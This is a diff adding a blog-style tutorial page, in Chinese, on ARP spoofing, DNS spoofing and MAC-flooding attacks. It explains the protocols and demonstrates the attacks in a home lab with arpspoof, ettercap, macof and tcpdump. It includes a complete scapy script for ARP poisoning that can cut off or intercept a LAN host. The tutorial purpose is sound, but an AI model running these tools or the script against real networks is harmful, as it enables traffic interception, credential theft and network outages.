@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ARP欺骗\&DNS欺骗\&mac泛洪攻击 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ARP\u6b3a\u9a97\\\u0026amp;DNS\u6b3a\u9a97\\\u0026amp;mac\u6cdb\u6d2a\u653b\u51fb", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "arp\u534f\u8bae\u4e0e\u6b3a\u9a97", url: "#arp" },
+              {title: "DNS\u6b3a\u9a97", url: "#dns" },
+              {title: "mac\u6cdb\u6d2a\u653b\u51fb", url: "#mac" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/" class="btn btn-xs btn-link">
+        NTLM Relay及相关原理
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="btn btn-xs btn-link">
+        ADCS安全问题
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="arpdnsmac">ARP欺骗\&amp;DNS欺骗\&amp;mac泛洪攻击</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#arp协议与欺骗">arp协议与欺骗</a><ul>
+<li><a href="#简单概要">简单概要：</a></li>
+<li><a href="#作用">作用：</a></li>
+<li><a href="#arp高速缓存表">arp高速缓存表：</a></li>
+<li><a href="#arp分组格式">arp分组格式</a></li>
+<li><a href="#免费arp">免费arp</a></li>
+<li><a href="#代理arp">代理arp</a></li>
+<li><a href="#arp攻击">arp攻击</a><ul>
+<li><a href="#攻击原理">攻击原理：</a></li>
+<li><a href="#利用arspoof实现断网攻击">利用arspoof实现断网攻击</a></li>
+</ul>
+</li>
+<li><a href="#使用arpspoof工具和driftnet工具来截获图片wireshark来直接抓包">使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包</a></li>
+<li><a href="#arp攻击的脚本编写">arp攻击的脚本编写：</a></li>
+</ul>
+</li>
+<li><a href="#DNS欺骗">DNS欺骗</a><ul>
+<li><a href="#dns工作原理">dns工作原理</a></li>
+<li><a href="#DNS欺骗原理">DNS欺骗原理</a></li>
+<li><a href="#DNS欺骗工具实现">DNS欺骗工具实现</a></li>
+</ul>
+</li>
+<li><a href="#mac泛洪攻击">mac泛洪攻击</a><ul>
+<li><a href="#交换机">交换机:</a></li>
+<li><a href="#mac表与arp缓存表的区别">mac表与arp缓存表的区别</a></li>
+<li><a href="#交换机mac表的学习机制">交换机mac表的学习机制：</a></li>
+<li><a href="#泛洪攻击原理">泛洪攻击原理：</a></li>
+<li><a href="#使用kali上的macof来进行泛洪攻击">使用kali上的macof来进行泛洪攻击</a></li>
+<li><a href="#mac泛洪攻击的局限性">mac泛洪攻击的局限性:</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="arp">arp协议与欺骗</h2>
+<h3 id="_2">简单概要：</h3>
+<p>通过此协议来获取局域网中某IP地址的mac地址</p>
+<h3 id="_3">作用：</h3>
+<p>在局域网中的机器互相发送消息时，靠的是mac地址（也叫以太网地址）来确定目的地址的，而我们只知道IP地址，所以需要arp协议来把ip地址映射为mac地址。 具体实现原理是，比如我想知道192.168.1.1的mac地址，就会在广播域里广播arp请求，ip不是192.168.1.1的主机会自动忽略请求，而192.168.1.1主机则会应答请求，并返回自己的mac地址(由IP定位到mac地址)</p>
+<h3 id="arp_1">arp高速缓存表：</h3>
+<p>这个表用来缓存 ip地址与mac地址 的对应关系
+有动态表和静态表：</p>
+<pre><code class="language-text">动态表随时间的推移自动添加和删除,每个动态arp缓存都有自己的TTL(生存时间).TTL为0就会被删
+静态表是永久性的，手动添加和删除。
+</code></pre>
+<p><strong>局域网中ip到mac地址解析过程：</strong>
+1.当缓存表中存在目的IP对应的mac地址时 则直接返回与IP对应的mac地址
+2.当缓存表中没有对应关系时,则向局域网中发送arp广播请求目的IP的mac，收到arp应答后将对应关系记录到高速缓存表中
+<strong>高速缓存表的优缺点</strong>：
+优点：减少网络通信量，提高通信效率
+缺点：会造成安全隐患</p>
+<h3 id="arp_2">arp分组格式</h3>
+<p><img alt="QQ截图20210219144616" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219144616.png" title="QQ截图20210219144616" /></p>
+<pre><code class="language-text">1.arp请求的目的mac地址  全f时代表广播地址
+2.arp请求的来源mac地址
+3.字段3 以太网帧类型表示的是后面的数据类型，ARP请求和ARP应答这个值为0x0806
+4.字段4 表示硬件地址的类型，硬件地址不只以太网一种，是以太网类型时此值为1
+5.字段5 表示要映射的协议地址的类型，要对IPv4地址进行映射，此值为0x0800
+67.字段6和7 表示硬件地址长度和协议地址长度，MAC地址占6字节，IP地址占4字节
+8.操作类型字段，值为1，表示进行ARP请求；值为2，表示进行ARP应答；
+               值为3，表示进行RARP请求；值为4，表示进行RARP应答。（重要）
+9.字段9 发送端ARP请求或应答的硬件地址，这里是以太网地址，和字段2相同。
+10.字段10 发送ARP请求或应答的IP地址。
+11 12.目的端的硬件地址和协议地址
+
+</code></pre>
+<p><img alt="QQ截图20210219144723" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219144723.png" title="QQ截图20210219144723" /></p>
+<h3 id="arp_3">免费arp</h3>
+<p>免费arp是指主机发送arp查找自己的IP地址,发送端的协议地址和目的端的协议地址是一致的
+<strong>作用：</strong></p>
+<pre><code class="language-text">(如某些网关设备会每隔一定时间广播一次免费arp，让网络中其他主机更新arp缓存表中网关的mac地址，缓解arp攻击效果)
+(如黑客可以使用免费arp，将虚假伪造的 ip mac对应关系通过arp广播出去，使网络中其他主机更新arp缓存表，更新完成后，这些主机的数据会转发到错误的mac地址，从而实现arp欺骗）
+2.检查广播域里的其他主机有没有使用自己的IP，如果使用了，则会弹出 IP冲突 字样
+免费arp与普通arp的区别:
+普通arp的请求是 我需要某ip的mac地址，该IP是其他机器的IP地址
+免费arp的请求是 我需要某IP的mac地址，该IP是机器自己的IP地址，起到宣告作用，发出去后是不希望得到回应的，若有回应则说明了IP冲突了
+</code></pre>
+<h3 id="arp_4">代理arp</h3>
+<p>代理arp的意思是，一个主机把自己的mac地址给另一台机器使用来应答其他主机的arp请求。 实际上，这已经是某种意义上的arp欺骗</p>
+<h3 id="arp_5">arp攻击</h3>
+<h4 id="_4">攻击原理：</h4>
+<p>arp攻击就是伪造IP与mac的对应关系来实现arp欺骗，攻击者只要持续不断的发送伪造的arp响应包就能更改目标主机的arp缓存表，造成 断网攻击 或 中间人攻击</p>
+<h4 id="arspoof">利用arspoof实现断网攻击</h4>
+<p>用kali和物理机进行测试，kali是攻击机，物理机是受害者
+首先收集kali，物理机，网关的ip地址和mac</p>
+<p><img alt="QQ截图20210219150147" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219150147.png" title="QQ截图20210219150147" /></p>
+<p>假设我们想要在实际中实施攻击，首先需要扫描局域网中的IP，但我们一个一个ping就很浪费时间了，所以需要fping命令</p>
+<p><img alt="QQ截图20210219150203" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219150203.png" title="QQ截图20210219150203" /></p>
+<p>解读一下命令 arpspoof -i kali网卡名 -t 被攻击机ip 网关
+好的，我们物理机成功被断网</p>
+<p><img alt="QQ截图20210219144847" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219144847.png" title="QQ截图20210219144847" /></p>
+<h3 id="arpspoofdriftnetwireshark">使用arpspoof工具和driftnet工具来截获图片，wireshark来直接抓包</h3>
+<p><img alt="QQ截图20210219144946" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219144946.png" title="QQ截图20210219144946" /></p>
+<p>然后我们执行arpspoog指令</p>
+<p><img alt="QQ截图20210219145018" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145018.png" title="QQ截图20210219145018" /></p>
+<p>此时我们物理机就能连上外网了</p>
+<p><em>坑点:开启ip转发后物理机依旧不能连上外网.</em></p>
+<p>我的解决方法是重启一下，再修改以下ip_forward文件然后等一会，物理机就可以连上外网了.arp欺骗后物理机网可能会卡。</p>
+<p>此时，物理机发给网关的通信信息我们都能获得到了，我们可以在虚拟机中使用driftnet工具捕获物理机正在浏览的图片</p>
+<p><img alt="QQ截图20210219145032" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145032.png" title="QQ截图20210219145032" /></p>
+<h3 id="arp_6">arp攻击的脚本编写：</h3>
+<p>arp攻击脚本需要用到scapy库来帮助我们完成arp数据包的编写</p>
+<pre><code class="language-text">讲讲里面的一些函数(没有继续研究scapy库)
+get_if_hwaddr('网卡名')  //获得自己的mac地址，一般填WLAN或eth0
+getmacbyip('ip)         //获得某IP的mac地址
+srp(....)               //发第二层包并返等待回应，返回值的第一个参数是回应包体。第二个参数是未回应包体
+
+sendp(Ether(src=a,dst=b)/ARP(hwsrc=c,psrc=d,pdst=e,op=f))
+//这是arp发包的构造 sendp是发第二层数据包并不等待回包 Ether是构造包体的意思
+//a为自己的mac地址 b为目标机器的mac地址，
+//c为发包的来源mac，d为发包的来源ip，e是目标机器的ip，f是arp操作类型字符
+//arp欺骗的话，把d改成网关IP即可
+</code></pre>
+<p>网上嫖的ip，mac扫描模块，这一步也可以手动获取</p>
+<pre><code class="language-text">from scapy.all import *
+
+##im_scan('192.168.1.1/24'),mac ip地址扫描函数
+def im_scan(ipduan):
+    ipscan=ipduan
+    try:
+        ans,unans = srp(Ether(dst=&quot;FF:FF:FF:FF:FF:FF&quot;)/ARP(pdst=ipscan),timeout=2,verbose=False)
+    except Exception as e:
+        print (str(e))
+    else:
+        for snd,rcv in ans:
+            list_mac=rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)
+            print (list_mac)
+</code></pre>
+<p>这个脚本仅能断网嗷,可以对单个机器断网，也可以断整个局域网的网</p>
+<pre><code class="language-text">from scapy.all import *
+import time
+import threading
+
+def im_scan(ipduan):#扫描
+    ipscan=ipduan
+    try:
+        ans,unans = srp(Ether(dst=&quot;FF:FF:FF:FF:FF:FF&quot;)/ARP(pdst=ipscan),timeout=2,verbose=False)
+    except Exception as e:
+        print (str(e))
+    else:
+        for snd,rcv in ans:
+            list_mac=rcv.sprintf(&quot;%Ether.src% - %ARP.psrc%&quot;)
+            print (list_mac)
+
+def arp_spoof(tgt_ip,gateway_ip,iface):
+    mmac=get_if_hwaddr(iface)
+    tgt_mac=getmacbyip(tgt_ip)
+    if tgt_ip:
+        while 1:
+            sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,pdst=tgt_ip,op=2))
+    else:
+        while 1:
+            sendp(Ether(src=mmac,dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=mmac,psrc=gateway_ip,op=2))
+
+def arp_gate(tgt_ip,gateway_ip,iface):
+    mmac=get_if_hwaddr(iface)
+    tgt_mac=getmacbyip(tgt_ip)
+    while 1:
+        sendp(Ether(dst=gateway_mac,src=mmac)/ARP(hwsrc=mmac,psrc=tgt_ip,pdst=gateway_ip,op=2))
+
+if __name__=='__main__':
+    ipduan='192.168.0.0/24'
+    tgt_ip='192.168.0.104' #要打整个局域网就别设置这个，要截获外界发往机器的数据这个也必须设置
+    gateway_ip='192.168.0.1'
+    iface='WLAN'
+    threads_num=20
+    print(&quot;如果想搞整个局域网就别设置tgt_ip,要截获外界发往机器的数据这个必须设置&quot;)
+    so_scan=input(&quot;[+]要扫描局域网存活主机和它的mac吗[Y/N]&quot;)
+    if so_scan=='Y':
+        im_scan(ipduan)
+    else:
+        so_judge=input(&quot;[+]你是想让机器的发送的数据被你截获Y，还是外界发送给机器的数据被你截获N[Y/N]&quot;)
+        if so_judge=='Y':
+            try:
+                print('开始截胡机器发送往外界的数据')
+                time.sleep(3)
+                for i in range(threads_num):
+                    t1=threading.Thread(target=arp_spoof,args=(tgt_ip,gateway_ip,iface),name=str(i))
+                    t1.start()
+            except KeyboardInterrupt:
+                print('[+]stopppppppp')
+        else:
+            if tgt_ip:
+                try:
+                    print('开始截胡外界发往机器的数据')
+                    time.sleep(3)
+                    for i in range(threads_num):
+                        t2=threading.Thread(target=arp_gate,args=(tgt_ip,gateway_ip,iface),name=str(i))
+                        t2.start()
+                except KeyboardInterrupt:
+                    print('[+]stopppppppp')
+            else:
+                print('请设置tgt_ip')
+</code></pre>
+<p>广播欺骗，受害机上的抓包效果 3c那个是我的mac地址</p>
+<p><img alt="QQ截图20210219145053" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145053.png" title="QQ截图20210219145053" /></p>
+<h2 id="dns">DNS欺骗</h2>
+<h3 id="dns_1">dns工作原理</h3>
+<p>dns（域名系统）将域名和IP地址相互映射，dns协议即域名解析协议，用来将用户输入的域名解析为IP。
+具体一点，当用户访问某个域名如<a href="http://www.baidu.com/" title="www.baidu.com">www.baidu.com</a>时， 首先向本地dns发出请求
+若本地dns缓存表无该域名IP映射关系，就会向根域名服务器发起查询，根域名服务器返回com域服务器地址给本地dns服务器
+本地dns服务器向com域服务器发起查询，com域服务器返回baidu.com域服务器给本地dns服务器
+本地dns服务器向baidu.com域服务器发起查询，baidu.com域服务器返回<a href="http://www.baidu.com/" title="www.baidu.com">www.baidu.com</a>地址</p>
+<h3 id="dns_2">DNS欺骗原理</h3>
+<p>在arp欺骗后获取到了受害机发起的dns请求包，然后返回一个自己构造的dns响应包，伪造自己想要的ip域名映射关系。
+因为DNS欺骗是建立在arp欺骗基础上，arp欺骗又必须在局域网进行，故DNS欺骗也只能在局域网进行</p>
+<h3 id="dns_3">DNS欺骗工具实现</h3>
+<p><img alt="QQ截图20210219145146" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145146.png" title="QQ截图20210219145146" /></p>
+<pre><code class="language-text">ettercap -T -q -P dns_spoof -M arp:remote /受害者IP///
+
+</code></pre>
+<p><img alt="QQ截图20210219145220" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145220.png" title="QQ截图20210219145220" /></p>
+<h2 id="mac">mac泛洪攻击</h2>
+<h3 id="_5">交换机:</h3>
+<p>交换机，只能做有线链接，所以拿这个是不能用作wifi的。
+交换机的作用是转发局域网内两台机器之间的互相的请求（有线连接的机器）。</p>
+<p>交换机具体传输数据帧的过程：</p>
+<pre><code class="language-text">假设主机A第一次向主机B发送数据
+主机A向交换机发起一个源mac地址为自己，目标mac地址为主机B的数据帧
+交换机收到后，将源mac地址和其对应接口记录到mac地址表中（mac地址表与arp缓存表有区别）
+交换机在自己的mac地址表中检查是否有目标mac的信息，如果有则向目标mac接口转发数据帧，如果没有，就会向所以非数据来源接口的接口广播该数据帧（mac泛洪攻击原理）
+局域网内主机都收到了此数据帧，但只有主机B会响应该数据帧并且回应，回应信息里注明主机B的mac地址以便记录到mac地址表，其他主机都不会有反应。
+交换机接收到主机B的回应后，会记录其mac 接口的映射关系，以后AB通信时会调用mac地址表中的记录，实现单播
+</code></pre>
+<h3 id="macarp">mac表与arp缓存表的区别</h3>
+<p>mac表记录在交换机中，用于记录接口 mac地址的对应关系
+arp缓存表记录在本机中，用于记录IP mac地址的对应关系</p>
+<h3 id="mac_1">交换机mac表的学习机制：</h3>
+<p>mac表一般都是有大小限制的，一旦mac表满了，其他mac地址就加不进来了。
+一旦其他mac地址加不进来了，那么mac表就无法进一步学习，之后的所有请求都会被广播到局域网，实现泛洪。
+mac表是有老化机制的，若交换机与某台主机长时间未通信，交换机就会把该主机的mac地址删除，等下一次通信时再学习。</p>
+<h3 id="_6">泛洪攻击原理：</h3>
+<p>泛洪攻击的目的是获取主机之间的通信数据，要达到这个目的则需要强迫交换机把接收到的数据帧统统广播出来。泛洪攻击原理则是向交换机发送大量未知mac地址让交换机不停学习，把mac表充满，这样正常主机mac地址老化后就无法再添加到mac地址表中，以后的所有通信数据都会被广播出来</p>
+<h3 id="kalimacof">使用kali上的macof来进行泛洪攻击</h3>
+<p>目前有三台机器</p>
+<p><img alt="QQ截图20210219145424" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145424.png" title="QQ截图20210219145424" /></p>
+<p>我们试着截获物理机登录ftp服务器时的账户与密码
+先使用命令macof，让交换机的mac表被占满
+仅输入macof即可</p>
+<p><img alt="QQ截图20210219145448" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145448.png" title="QQ截图20210219145448" /></p>
+<p>输入tcpdump -nn -X -i eth0 tcp port 21开始抓包（建议不用wireshark，是因为同一时间macof命令发出的数据包太多了，用wireshark会巨卡）</p>
+<p><img alt="QQ截图20210219145510" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145510.png" title="QQ截图20210219145510" /></p>
+<p><img alt="QQ截图20210219145527" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145527.png" title="QQ截图20210219145527" /></p>
+<p><img alt="" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145527.png" /></p>
+<p>下面是抓http包</p>
+<p><img alt="QQ截图20210219145603" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219145603.png" title="QQ截图20210219145603" /></p>
+<h3 id="mac_2">mac泛洪攻击的局限性:</h3>
+<p>只能在局域网内攻击另一个局域网内机器.
+且攻击目标必须和自己用交换机有线连接起来
+也就是说你的电脑发起mac泛洪是攻击不到你的手机的。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/NTLM%20Relay%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/" class="btn btn-xs btn-link">
+        NTLM Relay及相关原理
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/ADCS%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="btn btn-xs btn-link">
+        ADCS安全问题
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
